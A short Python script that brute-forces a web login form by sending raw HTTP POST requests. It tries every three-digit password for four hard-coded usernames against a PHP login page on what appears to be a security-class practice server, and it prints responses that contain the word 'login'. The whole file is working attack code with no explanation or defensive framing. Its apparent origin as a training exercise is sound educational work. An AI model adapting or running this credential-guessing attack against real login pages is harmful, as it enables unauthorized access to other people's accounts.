#!/bin/python

import socket

socket.setdefaulttimeout(10000)
users = [ "sarah", "petem", "admin", "sandyb" ]
def sendHttp(req):
    soc = socket.socket()
    soc.connect(("attackdirect.samsclass.info", 80))
    soc.send(req)
    res = soc.recv(1024)
    if "login" in res:
       print(res)
passwd = []
for i in range(0, 10):
    for j in range(0, 10):
        for k in range(0, 10):
            passwd.append(str(i)+str(j)+str(k))
for user in users:
    for password in passwd:
        l = len(user) + 8
        req = """POST /python/login3.php HTTP/1.1
Host: attackdirect.samsclass.info
Connection: keep-alive
Content-Length: """ + str(l) +\
"""
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=dbb1b428889c333626044aa2a8e4c59f51551031959; _ga=GA1.2.986712528.1555839078; _gid=GA1.2.864917254.1556033485

""" + \
"u=" + user + "&p=" + password + "\n"
        sendHttp(req)
